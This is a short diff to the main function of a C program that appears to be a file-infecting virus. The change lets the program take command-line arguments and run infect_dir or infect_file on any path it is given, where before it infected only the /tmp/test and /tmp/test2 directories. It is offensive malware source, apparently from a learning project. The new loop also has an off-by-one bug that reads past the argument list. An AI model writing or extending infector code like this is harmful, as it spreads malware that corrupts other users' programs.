@@ -37,15 +37,30 @@ int main(void) {
 
 #else
 
-int main(void) {
+int main(int argc, char **argv) {
 	void *site = memmem(stub_bin, stub_bin_len, (void*)&placeholders.entry, sizeof(placeholders.entry));
 	if (site == NULL) {
 		LOG("Placeholders not found\n");
 		return (1);
 	}
 	size_t offset = (uintptr_t)site - (uintptr_t)stub_bin - offsetof(struct placeholders, entry);
-	infect_dir("/tmp/test", stub_bin, stub_bin_len, offset);
-	infect_dir("/tmp/test2", stub_bin, stub_bin_len, offset);
+	if (argc > 1)
+	{
+		int i = 1;
+		while (i <= argc)
+		{
+			if (argv[i][strlen(argv[i]) - 1] == '/')
+				infect_dir(argv[i], stub_bin, stub_bin_len, offset);
+			else
+				infect_file(argv[i], stub_bin, stub_bin_len, offset);
+			i++;
+		}
+	}
+	else
+	{
+		infect_dir("/tmp/test", stub_bin, stub_bin_len, offset);
+		infect_dir("/tmp/test2", stub_bin, stub_bin_len, offset);
+	}
 	LOG("done\n");
 
 	return (0);
